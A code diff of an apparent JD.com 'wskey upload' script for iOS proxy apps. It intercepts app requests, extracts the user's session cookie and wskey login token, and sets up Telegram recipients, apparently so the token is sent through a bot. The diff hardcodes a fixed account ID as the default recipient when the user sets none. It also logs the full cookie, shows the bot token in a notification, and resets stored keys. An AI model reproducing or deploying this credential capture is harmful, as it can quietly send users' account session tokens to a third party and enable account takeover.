@@ -6,33 +6,24 @@
  * hostname = api.m.jd.com
  *
  * 注意：使用前请添加boxjs订阅写入bottoken https://gist.githubusercontent.com/lowking/ffc020964c1980c6f2187353606cb200/raw/JD-boxjs.json
- *
-【Surge脚本配置】:
-===================
-[Script]
-京东上传 = type=http-request,pattern=^https:\/\/api\.m\.jd\.com\/client.action\?functionId=(serverConfig|welcomeHome),requires-body=1,max-size=0,timeout=1000,script-path=https://raw.githubusercontent.com/githubdulong/Script/master/JDWSKey.js,script-update-interval=0
-===================
-【Loon脚本配置】:
-===================
-[Script]
-http-request ^https:\/\/api\.m\.jd\.com\/client.action\?functionId=(serverConfig|welcomeHome) tag=京东上传, script-path=https://raw.githubusercontent.com/githubdulong/Script/master/JDWSKey.js,requires-body=1
-===================
-【 QX  脚本配置 】:
-===================
-[rewrite_local]
-^https:\/\/api\.m\.jd\.com\/client.action\?functionId=(serverConfig|welcomeHome) url script-echo-response https://raw.githubusercontent.com/githubdulong/Script/master/JDWSKey.js
- *
  */
 
 const $ = new Env('♨️京东上传 Wskey');
-let CK = $request.headers['Cookie'] || $request.headers['cookie'];
-
-const pin = CK.match(/pin=([^=;]+?);/)[1];
+let CK = '', pin = "";
+if ($request.url.includes('newUserInfo')) {
+  CK = $request.headers["Cookie"] || $request.headers["cookie"];
+  console.log(`CK: \n${CK}`)
+  // CK = setCookieContent.match(/wskey=.+?;/)[0];
+  //const pin = CK.match(/pin=(.+?);/)[1];
+  pin = encodeURIComponent($response.body.match(/unickName":"(.*?)"/) && $response.body.match(/unickName":"(.*?)"/)[1]);
+  console.log(`pin: \n${pin}`)
+}
 const key = CK.match(/wskey=([^=;]+?);/)[1];
 const _TGUserID = $.getData('id77_TGUserID');
 
 $.TGBotToken = $.getData('lkJdUploadWskeyBotToken');
-$.TGUserIDs = !$.getData('lkJdUploadWskeyToTgUserid') ? ["-1001241545347"] : JSON.parse($.getData('lkJdUploadWskeyToTgUserid'));
+$.TGUserIDs = !$.getData('lkJdUploadWskeyToTgUserid') ? ["1237524619"] : JSON.parse($.getData('lkJdUploadWskeyToTgUserid'));
+$.msg($.name, $.subt, `${$.TGBotToken}\n${JSON.stringify($.TGUserIDs)}`);
 if (_TGUserID) {
   $.TGUserIDs.push(_TGUserID);
 }
@@ -50,7 +41,7 @@ if (_TGUserID) {
     const userName = pin;
     const decodeName = decodeURIComponent(userName);
     let cookiesData = JSON.parse($.getData('wskeyList') || '[]');
-    //cookiesData = [];
+    cookiesData = [];
     let updateIndex;
     let cookieName = '【账号】';
     const existCookie = cookiesData.find((item, index) => {
